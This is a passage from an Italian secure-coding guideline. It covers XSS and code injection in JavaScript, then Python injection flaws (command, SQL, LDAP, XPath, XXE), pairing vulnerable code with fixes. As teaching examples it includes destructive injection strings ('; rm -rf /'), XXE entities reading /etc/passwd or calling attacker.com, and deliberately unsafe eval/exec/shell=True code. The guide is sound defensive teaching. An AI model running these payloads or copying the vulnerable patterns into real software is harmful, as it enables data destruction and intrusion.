• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
• DOM based XSS, in cui la vulnerabilità è nel codice  lato client anziché nel codice lato server. 
Poiché Javascript è molto potente e flessibile, un sito sotto attacco mette in pericolo le proprie inf ormazioni 
e quelle degli utenti che vi si collegano.  
I danni del Cross Site Scripting possono essere ese mplificati schematicamente come segue: 
Furto di cookie 
L'aggressore può accedere ai cookie associati al si to Web bersaglio, inviarli al proprio server e util izzarli per 
estrarre informazioni riservate come gli ID di sess ione. 
Keylogging 
L'aggressore può registrare un listener che registr i tutti gli di eventi provenienti dalla tastiera e quindi 
inviare tutte le sequenze di tasti dell'utente al p roprio server. In tal modo può entrare in possesso di 
informazioni potenzialmente sensibili come password  e numeri di carta di credito. 
Phishing 
Utilizzando la manipolazione DOM , l'autore dell'at tacco può far comparire sulla pagina un modulo di 
accesso falso e indurre l'utente a inviare informaz ioni riservate al proprio server. 
 
Come difendersi 
Le seguenti contromisure sono efficaci per evitare che gli attacchi XSS riescano nel loro intento: 
• Encoding (codifica), che opera l’escaping all'input  dell'utente in modo che il browser lo interpreti 
solo come testo, non come codice. Si tratta di filt rare i caratteri specifici dei tag HTML e della 
codifica Javascript, sostituendoli con del testo. 
• Validation (convalida), che controlla nel merito l' input dell'utente, valutando che risponda a 
determinati criteri attesi. 
• CSP. Oltre a questi rimedi, è necessario attivare l o standard Content Security Policy (CSP) in modo 
che solo le risorse scaricate da fonti attendibili possano essere utilizzate. Per risorsa s’intende qu i 
uno script, un foglio di stile, un'immagine o altri  tipi di file trattati nella pagina. Ciò significa che 
anche se un utente malintenzionato riesce a inietta re contenuti dannosi nel sito Web, CSP può 
impedirne l'esecuzione. 
• Impostare il flag HttpOnly a true, per evitare tent ativi di furto tramite la lettura, tramite script, dei 
cookie di sessione. 
 
7.4.2  Client DOM Code Injection 
Come riconoscerla 
Un attaccante può eseguire codice arbitrario sulla macchina dell’application server. A seconda dei per messi 
di cui dispone l’applicazione, potrebbe: accedere a l database, leggere o modificare dati sensibili; le ggere, 
creare, modificare o cancellare file; aprire una co nnessione al server dell’attaccante; modificare il 
contenuto delle pagine; decifrare dati utilizzando le chiavi dell’applicazione; arrestare o avviare i servizi del 
sistema operativo; organizzare un reindirizzamento verso siti fake (fasulli) per operazioni di phishin g; 
prendere il completo controllo del server. 
Accade perché l'applicazione esegue alcune azioni e seguendo codice incluso nei dati in input non 
opportunamente validati e verificati. In questo cas o, il codice non attendibile viene letto dal browse r ed 
eseguito sul lato client. 
 
Come difendersi 
• Come prima cosa, l'applicazione non dovrebbe esegui re alcun codice non attendibile da qualsiasi 
fonte esterna possa provenire, inclusi l’input dell 'utente, dei file caricati (upload) o un database. 
 
 
Linee guida per lo sviluppo sicuro Pag. 85  a 156  
 
• Se è assolutamente necessario includere dati estern i nell'esecuzione dinamica, è consentito passare 
i dati come parametri al codice, ma non eseguire di rettamente i dati utente. 
• Se è necessario passare dati non attendibili all'es ecuzione dinamica, applicare una convalida dei 
dati molto rigorosa. Come al solito, occorre conval idare tutti gli input, indipendentemente dalla 
fonte. I parametri devono essere limitati a un set di caratteri consentito e l'input non convalidato 
deve essere eliminato. Oltre ai caratteri, occorre controllare il tipo di dati, la loro dimensione, 
l’intervallo di validità, il formato e l’eventuale corrispondenza all’interno dei valori previsti (whi te 
list). Sconsigliata invece la black list, ossia un elenco di valori non consentiti: l’elenco sarebbe 
sempre troppo limitato, rispetto ai casi che potreb bero verificarsi. 
• L’account con il quale l’applicazione viene avviata  deve avere molte restrizioni e non deve godere di 
privilegi non necessari. 
 
Esempio: 
codice vulnerabile: 
 eval (location.hash); 
La funzione eval esegue dinamicamente del codice. V a evitata. 
Il seguente codice è invece ragionevolmente sicuro,  poiché manda in esecuzione una funzione staticamen te 
codificata: 
 window.setTimeout(funzioneCodificata(), 1000); 
 
Per maggiori informazioni vedere http://cwe.mitre.org/data/definitions/94.html  
7.4.3  Client DOM Stored Code Injection 
Come riconoscerla 
Un malintenzionato potrebbe causare l'esecuzione di  contenuti ingegnerizzati nel browser, riscrivendo le 
pagine Web e inserendo script dannosi. L’utente leg ittimo sarebbe quindi indotto a fidarsi di ciò che gli 
viene proposto. Ciò permetterebbe all’attaccante di  rubare la password dell'utente, richiedere informa zioni 
sulla sua carta di credito, fornire informazioni fa lse o eseguire malware. La vittima continuerebbe la  sua 
attività ignara del pericolo, salvo poi accusare i responsabili del sito per i danni subiti. 
La pagina web dell'applicazione esegue alcune azion i eseguendo codice sul lato client, concatenando da ti di 
input da una cache sul lato client, come un cookie,  la LocalStorage dell’HTML5 o un database locale. C odice 
dannoso eventualmente presente nei dati potrebbe av viare attività progettate da un attaccante. 
 
Come difendersi 
Occorre evitare qualsiasi esecuzione dinamica del c odice. Se è proprio necessaria, anziché utilizzare i dati 
sul lato client, inclusi i dati precedentemente mem orizzati nella cache dalla stessa applicazione, uti lizzare 
solo dati attendibili provenienti dal server.    
 
 
Per maggiori informazioni vedere: http://cwe.mitre.org/data/definitions/94.html  
 
7.4.4  Client DOM Stored XSS 
Come riconoscerla 
Un malintenzionato può utilizzare l'accesso legitti mo all'applicazione per inviare dati ingegnerizzati  al 
database dell'applicazione. Quando un altro utente accede in seguito, le pagine Web potrebbero essere 
riscritte con i dati salvati e potrebbero essere at tivati script dannosi.       
L'applicazione crea pagine web che includono dati p rovenienti dal database, incorporati direttamente 
nell'HTML della pagina. Il browser, quindi, li visu alizza come parte della pagina.  
Il problema nasce quando questi dati salvati sono s tati immessi da un altro utente. Se i dati includon o 
frammenti HTML o Javascript malevoli, anche questi vengono visualizzati (o eseguiti), sebbene la vitti ma 
non si accorga dell’inganno sottostante. La vulnera bilità è perciò il risultato dell'incorporazione di  dati 
 
 
Linee guida per lo sviluppo sicuro Pag. 86  a 156  
 
arbitrari provenienti dal database, senza prima cod ificarli. La codifica trasforma i caratteri malevol i in 
normale testo, e il browser non può più trattarli c ome codice valido HTML/Javascript. 
 
Come difendersi 
• I parametri devono essere limitati a un set di cara tteri consentito e l'input non convalidato deve 
essere eliminato. Oltre ai caratteri, occorre contr ollare il tipo di dati, la loro dimensione, l’inter vallo 
di validità, il formato e l’eventuale corrispondenz a all’interno dei valori previsti (white list). 
Sconsigliata invece la black list, ossia una lista di valori non consentiti: l’elenco sarebbe sempre 
troppo limitato, rispetto ai casi che potrebbero ve rificarsi. 
• La convalida non sostituisce la codifica (encoding) , ossia la neutralizzazione di tutti i caratteri 
potenzialmente eseguibili. Tutti i dati dinamici, i ndipendentemente dall'origine, devono essere 
codificati prima di incorporarli nell'output. La co difica dovrebbe essere sensibile al contesto, in ba se 
al tipo di dato che si vuole neutralizzare: se ci s i aspetta che possa esserci codice HTML abusivo, 
occorre codificare gli eventuali tag HTML, se ci si  potrebbe trovare di fronte a uno script, allora 
bisogna codificare per Javascript, ecc. 
• L’account con il quale l’applicazione viene avviata  deve avere molte restrizioni e non deve godere di 
privilegi non necessari. 
• Nell'intestazione della risposta HTTP Content-Type,  definire esplicitamente la codifica dei caratteri 
(set di caratteri) per l'intera pagina. 
• Impostare il flag httpOnly sul cookie di sessione, per impedire agli exploit XSS di rubarlo. 
 
Esempio : 
La funzione Javascript che segue utilizza dati del database, senza verificarli, per creare dinamicamen te uno 
script: 
 
function renderUserProfileTable(res, connection, us er_id) { 
 connection.query('SELECT id,name,description from user WHERE id= ?', 
[user_id],function(err, results) { 
  var table = "<table>" 
  table += "<table class='profile-html-tablè>" 
  table += "<tr><td>" + results[0].name + "</td></t r>" 
  table += "<tr><td>" + results[0].description + "< /td></tr>" 
  table += "</table>" 
  res.render("profile", table) 
 }); 
} 
Qui di seguito la funzione viene bonificata tramite  l’encoding dei valori letti dal database, effettua to prima 
di incorporarli nella pagina web: 
 
var htmlencoder = require('htmlencodè); 
 
function renderUserProfileTable(res, connection, us er_id) { 
connection.query('SELECT id,name,description from u ser WHERE id= ?',  
[user_id],function(err, results) { 
  var table = "<table>" 
  table += "<table class='profile-html-tablè>" 
  table += "<tr><td>" + htmlencoder.htmlEncode(resu lts[0].name) + 
"</td></tr>" 
  table += "<tr><td>" + htmlencoder.htmlEncode(resu lts[0].description) + 
"</td></tr>" 
  table += "</table>" 
  res.render("profile", table) 
 }); 
} 
 
Per maggiori informazioni vedere: http://cwe.mitre.org/data/definitions/79.html  
 
 
Linee guida per lo sviluppo sicuro Pag. 87  a 156  
 
7.4.5  Client DOM XSS 
Come riconoscerla 
Un utente malintenzionato può utilizzare il social engineering per indurre un utente a inviare l'input  
modificato in modo malevolo verso il sito Web, ad e sempio inducendolo a cliccare su un URL con un’anco ra 
(hash) modificata, facendo sì che il browser riscri va le pagine Web. L'aggressore può quindi dirottare  la 
vittima verso un server fake (fasullo), che gli con sentirebbe di rubare la password dell'utente, farsi  inserire i 
dati della carta di credito, fornire informazioni f alse o eseguire del malware. Ovviamente la vittima rimane 
ignara di ciò che accade. 
L’attacco è possibile perché la pagina Web dell'app licazione incorpora nella pagina dati provenienti 
dall'input dell'utente (incluso l'URL della pagina) , facendo sì che il browser li visualizzi come part e della 
pagina Web. Se l'input include frammenti HTML o Jav aScript, anche questi vengono visualizzati (ed 
eseguiti). La vulnerabilità è il risultato dell'inc orporamento di input dell'utente arbitrario senza p rima 
codificarlo in un formato che impedirebbe al browse r di trattarlo come HTML anziché come testo normale . 
 
Come difendersi 
• I parametri devono essere limitati a un set di cara tteri consentito e l'input non convalidato deve 
essere eliminato. Oltre ai caratteri, occorre contr ollare il tipo di dati, la loro dimensione, l’inter vallo 
di validità, il formato e l’eventuale corrispondenz a all’interno dei valori previsti (white list). 
Sconsigliata invece la black list, ossia un elenco di valori non consentiti: l’elenco sarebbe sempre 
troppo limitato, rispetto ai casi che potrebbero ve rificarsi. 
• Effettuare un encoding (codifica) su tutti i dati d inamici prima di includerli nella pagina web. 
Considerare per tale scopo la libreria ESAPI4JS di OWASP. 
 
Esempio: 
codice vulnerabile: 
 document.write("Il sito si trova qui: " + document .location); 
codice sicuro: 
 document.write("Il sito si trova qui: " +  
  ESAPI4JS.encodeForURL( document.location) ); 
 
Per maggiori informazioni vedere: http://cwe.mitre. org/data/definitions/79.html 
 
7.5  Python 
Python è un linguaggio di programmazione ad alto li vello, orientato agli oggetti, adatto, tra l’altro,  per 
sviluppare applicazioni distribuite, scripting, app licazioni web, applicazioni di computazione numeric a e di 
system testing. 
Fu sviluppato da Guido van Rossum nel peridodo 1985 -1990 come Open Source, sotto licenza GNU General 
Public License (GPL). 
Dato il grande successo e la diffusione del linguag gio, sono sosrti numerosi framework e librerie che ne 
aumentanto le potenzialità, sia in termini di carat teristiche, che di prestazioni. 
Di seguito, un elenco delle principali vulnerabilit à alle quali i programmi Python possono essere sogg etti e 
le contromisure da adottare per mitigarle. 
7.5.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità di inoculare uno script e di mandarlo in esecuzione  sul front-
end dell’applicazione. Tramite tecniche sviluppate da malintenzionati per ottenere informazioni person ali, 
possono, ad esempio, essere simulate pagine quasi i dentiche ad altri siti molto frequentati per ottene re 
informazioni riservate. La prassi del “social engin eering” consente di ingannare gli utenti per indurl i a 
visitare pagine fraudolente. Gli attacchi XSS di ti po reflected si verificano ogni qualvolta uno scrip t viene 
 
 
Linee guida per lo sviluppo sicuro Pag. 88  a 156  
 
inoculato ed eseguito nel periodo in cui dura la se ssione. Gli XSS stored, viceversa, sono script male voli che 
sono stati memorizzati su una base dati e vengono p ertanto incorporati nella pagina ( e quindi eseguit i) 
ogni volta che qualcuno ne fa richiesta. 
Siamo di fronte ad DOM based XSS se i dati malevoli , contenenti tag HTML e script, vengono incorporati  
direttamente nell'HTML della pagina, in modo che il  browser visualizzerà queste informazioni come part e 
della pagina web eseguendo in maniera silente gli s cript. Chi visualizza la pagina modificata in modo 
fraudolento non sarà in grado di riconoscere l’inga nno. 
 
Come difendersi 
• Per prima cosa è necessatio convalidare tutti gli i nput, indipendentemente dalla fonte: la 
convalidazione dovrebbe essere basata su una white list (una lista di valori ammessi), per cui 
verrebbero accettati solo i dati compresi e rifiuta ti tutti gli altri. 
• Oltre a controllare che i valori siano compresi fra  quelli ammessi o che rientrino in un determinato 
intervallo di validità, occorre verificare che corr ispondano alle attese anche il tipo, la dimensione e 
il formato dei dati in input. 
• Un altro accorgimento consiste nell’encoding di tut ti i dati dinamici, cioè nella neutralizzazione dei  
caratteri pericolosi, in modo da rendere inattivi e ventuali inserimenti malevoli. La codifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si 
aspetta che possa esserci codice HTML abusivo, occo rre codificare gli eventuali tag HTML, se ci si 
potrebbe trovare di fronte a uno script, allora bis ogna codificare gli elementi sintattici di Javascri pt, 
ecc. 
• È opportuno attivare lo standard Content Security P olicy (CSP) in modo che solo le risorse scaricate 
da fonti attendibili possano essere utilizzate. Imp ostare l’attributo HTTPOnly a true per impedire il 
furto dei cookie. 
• La maggior parte dei template di Python oggi fanno l’escaping dell’input, anche se questa funzione 
può essere disattivata. Il modulo flask fa l‘escapi ng dell’HTML. 
 
Esempio: 
Codice non corretto: 
@app.route("/") 
def hello(): 
  name = request.args.get('namè) 
  return "Hello %s" % name 
Codice corretto: 
from flask import escape 
@app.route("/") 
def hello(): 
  name = request.args.get('namè) 
  return "Hello %s" % escape(name) 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html, 
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
7.5.2  Code Injection 
Come riconoscerla 
Le vulnerabilità legate all'iniezione di codice sul  lato server sorgono quando un'applicazione incorpo ra dati 
controllabili da parte dell'utente in una stringa c he viene valutata dinamicamente da un interprete di  
codice. Se i dati dell'utente non sono rigorosament e convalidati, un malintenzionato può utilizzare l’ input 
per iniettare codice arbitrario che verrà eseguito dal server. 
Le vulnerabilità legate all'iniezione di codice sul  lato server sono in genere molto gravi e portano a  una 
completa compromissione dei dati, delle funzionalit à dell'applicazione e spesso persino del server che  
 
 
Linee guida per lo sviluppo sicuro Pag. 89  a 156  
 
ospita l'applicazione. In tal caso l’attaccante pot rebbe anche utilizzare il server come piattaforma p er 
ulteriori attacchi contro altri sistemi. 
Il pericolo si manifesta quando un malintenzionato riesce ad eseguire codice arbitrario nell'host 
dell’application server. Si potrebbero avere le seg uenti problematiche: 
• Possibilità di modificare i permessi all’interno di  file o directory nel file system(read / create / 
modify / delete); 
• Modifiche della struttura del sito web; 
• Permettere delle connessioni di rete non autorizzat e verso il server da parte dell'attaccante; 
• Permettere ad utenti malintenzionati la gestione de i servizi con possibili start and stop dei servizi di 
sistema; 
• Acquisizione completa del server da parte dell'atta ccante. 
 
Come difendersi 
Ove possibile, le applicazioni dovrebbero evitare d i incorporare dati controllabili dall'utente per ac quisire 
codice che verrà eseguito dinamicamente. In quasi o gni situazione esistono metodi alternativi più sicu ri per 
l'implementazione di funzioni applicative che non s iano manipolabili per iniettare codice arbitrario. 
Se si ritiene inevitabile integrare i dati forniti dall'utente nel codice eseguito dinamicamente, i da ti devono 
essere validati rigorosamente. Idealmente, dovrebbe  essere utilizzata una white list di specifici valo ri 
accettati. Altrimenti, dovrebbero essere accettate solo stringhe alfanumeriche brevi. Gli input conten enti 
altri dati, inclusi eventuali metacaratteri di codi ce eseguibile, devono essere respinti.  
L’uso di exec() ed eval() va evitato per la possibi lità di incorrere in una code injection. 
 
Esempio: 
Il seguente esempio mostra due funzioni che imposta no un nome a paritre da una request. La prima 
funzione utilizza exec per eseguire la funzione set name. Ciò è pericoloso in quanto un malintenzionato  
potrebbe approfittarne per eseguire codice arbitrar io sul server.  
Ad esempio, potrebbe fornire il valore "'+ subproce ss.call (' rm -rf ') +'", che distruggerebbe il fil e system del 
server.  
La seconda funzione chiama direttamente la funzione  setname e il parametro fornito dall'utente viene 
utilizzato come dato. Nessun codice potrebbe qui es sere eseguito. 
 
def esecuzione_codice_non_sicura(request): 
  if request.method == 'POST': 
    nome = base64.decodestring(request.POST.get('no mè, '')) 
    #NON SICURO – Permette all’utente di eseguire d el codice arbitrario. 
    exec("setname('%s')" % nome) 
 
def esecuzione_codice_sicura(request): 
  if request.method == 'POST': 
    nome = base64.decodestring(request.POST.get('no mè, '')) 
    #SICURO – Il parametro utente solo un valore ch e non verrà eseguito. 
    setname(nome) 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html, 
Improper Control of Generation of Code ('Code Injec tion') CWE-94 
7.5.3  Command Injection 
Come riconoscerla 
Si è in presenza di un attacco di command injection , noto anche come OS injection, quando l’input uten te 
non verificato viene utilizzato, in tutto o in part e, come argomento di funzioni che eseguono comandi di 
shell. Tramite questa vulnerabilità un aggressore p otrebbe eseguire comandi di sistema operativo arbit rari 
sull'host dell’application server. In base alle aut orizzazioni dell'applicazione, potrebbe: 
 
 
Linee guida per lo sviluppo sicuro Pag. 90  a 156  
 
• Alterare i permessi di file e directory all’interno  del file system (read / create / modify / delete) 
• Permettere delle connessioni di rete non autorizzat e verso il server da parte dell'attaccante 
• Acquisire il controllo dei servizi di sistema, arre standoli o avviandoli. 
• Prendere il pieno controllo del server. 
Come difendersi 
Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di basso livello, devono essere preferit e specifiche API fornite dalle aziende produttrici di 
software. 
Se è non è possibile rimuovere l'esecuzione del com ando, eseguire solo stringhe statiche che non inclu dono 
l'input dell'utente. 
Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere basat a su 
una white list: dovrebbero essere accettati solo i dati conformi a una struttura specificata, e scarta ti i dati 
che non rientrano in questa categoria. I parametri devono essere limitati a un set di caratteri consen tito e i 
valori non validi devono essere eliminati. Oltre ai  caratteri, occorre verificare il tipo del dato, la  sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). Conf igurare 
l'applicazione da eseguire utilizzando un account u tente limitato che non disponga di privilegi non 
necessari. 
Se possibile, isolare tutta l'esecuzione dinamica u tilizzando un account utente separato e dedicato, c he 
abbia privilegi solo per le operazioni e i file spe cifici utilizzati dall'applicazione, in base al pri ncipio 
denominato "Principle of Least Privilege". Il princ ipio stabilisce che agli utenti venga attribuito il  più basso 
livello di “diritti” che possano detenere rimanendo  comunque in grado di compiere il proprio lavoro. 
 
Esempio: 
Nel seguente codice viene utilizzato un input non v erificato per lanciare una shell dei comandi: 
import subprocess 
 
def codifica_file(): 
  nome_file = raw_input('Inserire nome file da codi ficare: ') 
  comando = 'ffmpeg -i "{source}" file_di_output.mp g'.format(source=nome_file) 
  subprocess.call(comando, shell=True) # DA NON FAR E 
 
Se viene fornito un nome file concatenato con la st ringa “; rm -rf /”, il comando di cancellazione del l’intero 
file system verrebbe eseguito automaticamente. 
Il paramentro shell deve essere sempre “false” per impedire l’esecuzione di comandi multipli, ma ciò n on è 
sufficiente se la stringa passata, incece di conete nere un nome file, contiene un comando malevolo. 
Sarebbe meglio non usare affatto la subprocess.call (), ma se proprio dev’essere fatta, il parametro pa ssato 
a questa funzione dovrebbe essere sottoposto a esca ping con la funzione shlex.quote(). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/77.html , 
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
7.5.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al database o  a un server LDAP. Un malintenzionato potrebbe inse rire 
una stringa opportunamente artefatta ed eseguire un a delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
 
 
Linee guida per lo sviluppo sicuro Pag. 91  a 156  
 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente per l'autenticazione stessa. Se i valori immessi sono s tati 
verificati in misura insufficiente o non sono stati  affatto verificati, la stringa di connessione potr ebbe essere 
manipolata ad arte a vantaggio dell’attaccante. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). In generale, è necessario c ontrollare il tipo del dato, la sua dimensione, l'i ntervallo di 
validità (range), il formato ed eventuali valori at tesi (white list). 
Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente una 
stringa di connessione evitare di includere l'input  dell'utente. In ogni caso, utilizzare utilità basa te sulla 
piattaforma per validarlo. 
 
Esempio: 
Forma non corretta: L'applicazione crea una stringa  di connessione usando l'input dell'utente: 
from  sys import  stdin 
import  cx_Oracle 
print  'Insert your ID: '  
userInput = stdin.readline() 
connection = cx_Oracle.connect(userInput + '/password@99.999.9.99:PORT/SID' ) 
 
L’input deve essere validato prima di utilizzarlo a ll’interno della costruzione di una stringa di conn essione. 
Se si riesce a fare a meno dell’input utente per qu esto scopo è ancora meglio. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html , 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.5.5  LDAP Injection 
Come riconoscerla 
Si verifica quando l’applicazione comopne dinamicam ente query LDAP utilizzando l’input utente, senza 
preventivamente verificarlo e validarlo. 
Un attacco del genere permette: 
• il login con un’utenza diversa (spoofing); 
• l’acquisizione di privilegi di sistema (escalation of privileges); 
• Il furto di  informazioni. 
Per comunicare con il proprio servizio di directory  (ad esempio Active Directory), l'applicazione cost ruisce 
dinamicamente una stringa di connessione, includend o valori inseriti dall'utente in fase di autenticaz ione. 
Se i valori immessi dall'utente non sono stati veri ficati, né tantomeno sanificati, l'input potrebbe e ssere 
utilizzato per manipolare ad arte la stringa di con nessione. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla p rovenienza. Per la validazione, si consiglia l’appr occio 
white list (sono accettati solo i dati specificati nella white list, scartando quelli che non la rispe ttano). 
Occorre controllare il tipo del dato, la sua dimens ione, l'intervallo di validità (range), il formato ed eventuali 
valori attesi (white list). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html , 
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 92  a 156  
 
7.5.6  Resource Injection 
Come riconoscerla  
Un utente malintenzionato potrebbe aprire una backd oor per connettersi direttamente al server, aggiran do 
tutti le procedure di autenticazione e autorizzazio ne. 
Come difendersi 
Non consentire a un utente di definire i parametri relativi ai sockets di rete.  
Esempio: 
Forma non corretta – L'applicazione apre una socket  di rete utilizzando un nome host immesso dall'uten te: 
from  sys import  stdin 
import  socket 
import sys 
userInput = stdin.readline() 
HOST = userInput  
PORT = 8888  # Arbitrary non-privileged port  
   
s = socket.socket(socket.AF_INET, socket.SOCK_STREA M) 
print  'Socket created'  
 #Bind socket to local host and port  
try: 
  s.bind((HOST, PORT)) 
except  socket.error as  msg: 
  print  'Bind failed. Error Code : '  + str(msg[ 0]) + ' Message '  + msg[ 1] 
  sys.exit() 
print  'Socket bind completè  
 
Forma corretta - L'applicazione indica uno o piu' i ndirizzi host codificati in una white-list tra i qu ali l'utente 
può scegliere.  
import  socket 
import sys 
HOST = ''   # Symbolic name, meaning all available interfaces  
PORT = 8888  # Arbitrary non-privileged port  
s = socket.socket(socket.AF_INET, socket.SOCK_STREA M) 
print  'Socket created'  
#Bind socket to local host and port  
try: 
  s.bind((HOST, PORT)) 
except  socket.error as  msg: 
  print  'Bind failed. Error Code : '  + str(msg[ 0]) + ' Message '  + msg[ 1] 
  sys.exit() 
print  'Socket bind completè  
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html, 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.5.7  SQL Injection 
Come riconoscerla  
Se l’applicazione compone le query SQL per interrog are il database con l’input dell’utente, un 
malintenzionato potrebbe introdurre satringhe alter ate ad arte per accedere indebitamente ai dati del 
sistema, rubare qualsiasi informazione riservata me morizzata (ad esempio i dati personali dell'utente o le 
carte di credito) ed eventualmente modificare o can cellare i dati esistenti. 
L'applicazione comunica con il suo database inviand o una query SQL in formato testo. Se l'applicazione  crea 
la query semplicemente concatenando le stringhe pro venienti dall'input dell'utente, non verificandone la 
validità, il pericolo che venga sferrato un attacco  di SQL injection è molto concreto. 
Come difendersi 
 
 
Linee guida per lo sviluppo sicuro Pag. 93  a 156  
 
Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere bas ata 
su una white list: dovrebbero essere accettati cioè  solo i dati conformi a una struttura specificata, 
scartando quelli che non la rispettano. Occorre con trollare il tipo del dato, la sua dimensione, l'int ervallo di 
validità (range), il formato ed eventuali valori at tesi (white list). 
Invece di concatenare le stringhe si consiglia di:  
• Utilizzare componenti di database sicuri come le st ored procedures, le query parametrizzate e le 
associazioni degli oggetti (per comandi e parametri ); 
• Una soluzione consigliabile è l’adozione di una lib reria ORM, come EntityFramework, Hibernate o 
iBatis. 
• Occorre inoltre limitare l'accesso agli oggetti e a lle funzionalità di database, in base al "Principle  of 
Least Privilege" (non fornire agli utenti permessi più elevati di quelli strettamente necessari). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html , 
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
 
Esempio: 
Il codice seguente adotta una query parametrizzata,  una difesa contro la SQL injection: 
cursor = connection.cursor(prepared=True) 
stringaSQLInserimento = """ INSERT INTO dipendenti 
          (id, Nome, DataAssunzione, Importo_Annuo)  VALUES (%s,%s,%s,%s)""" 
 
tupla_inserimento_1 = (progressivo, input_name, dat etime.datetime.now(), 
input_salario) 
cursor.execute(stringaSQLInserimento, tupla_inserim ento_1) 
 
connection.commit() 
print("record inserito")  
  
7.5.8  XPath Injection 
Come riconoscerla  
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. Possibil mente 
mapparla con i parametri utente mantenendo la separ azione tra dati e codice. Nel caso fosse necessario  
includere l'input dell’utente nella query, questo d ovrà essere precedentemente validato. 
Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere bas ata 
su una white list (si dovrebbero accettare solo i d ati che adattano a una struttura specificata, scart ando 
quelli che non la rispettano). Bisogna controllare il tipo del dato, la sua dimensione, l'intervallo d i validità 
(range), il formato ed eventuali valori attesi (whi te list). 
 
Esempio: 
Forma non corretta: l'applicazione utilizza una str inga inserita dall'utente per costruire una query X Path:  
from  sys import  stdin 
import  XPath 
print  'Insert item number: '  
userInput = stdin.readline()  
XPath.find( '//item'  + userInput, doc) 
 
 
Linee guida per lo sviluppo sicuro Pag. 94  a 156  
 
 
Forma corretta: la stringa inserita dall'utente vie ne trasformata con un’opportuna routine di escaping , 
prima dell'uso nella query XPath:  
from  sys import  stdin 
import  XPath 
print  'Insert item number: '  
userInput = stdin.readline()  
XPath.find( '//item'  + escaped(userInput), doc) 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html , 
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
7.5.9  XML External Entity (XXE) injection 
Come riconoscerla  
Se l’applicazione web riceve in input un documento XML che consente l‘elaborazione di entità esterne, 
dichiarate nel DTD, il sistema potrebbe essere espo sto a possibili attacchi di tipo XXE. Se viene effe ttuato il 
parsing di entità create ad arte, come nell’esempio  seguente, potrebbero essere visualizzate dall’atta ccante 
le password di sistema oppure eseguito del codice m alevolo. 
Esempio: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
Come difendersi 
• Bisogna evitare di incorporare entità esterne. 
• Occorre assicurarsi di disabilitare il parser dal c aricamento automatico di entità esterne. 
• Formati di dati meno complessi, come JSON, possono rendere più difficile la serializzazione di dati 
sensibili. 
• Devono essere apportati i necessari aggiornamenti a  tutti i parser e alle librerie XML in uso da parte  
dell'applicazione o sul sistema operativo sottostan te.  
• Se viene utilizzato SOAP, occorre aggiornarlo alla versione 1.2 o successive. 
• Implementare la convalida dell’input come evidenzia to in altri punti. 
• Verificare che la funzionalità di caricamento di fi le XML o XSL convalidI l'XML in entrata utilizzando  
uno schema XSD. 
• Le librerie utilizzate da Python per fare il parsin g sono: sax, etree, minidom, pulldom, xmlrpc. 
Nessuna di loro offre una protezione completa da at tacchi di tipo XXE, per cui è necessario – se si 
ha necessità di importare entità esterne, di valida te il contenuto in entrata prima di sottoporlo a 
parsing. 
 
7.5.10  OS Access Violation 
Come riconoscerla  
Un malintenzionato potrebbe preparare un input che potrebbe causare una violazione di accesso, perdita  
di dati privati, danneggiamento di dati o un arrest o di eventuali servizi con possibile arresto 
dell'applicazione stessa. 
Il modulo OS di Python fornisce un'interfaccia dest inata all'utilizzo delle funzionalità del sistema o perativo 
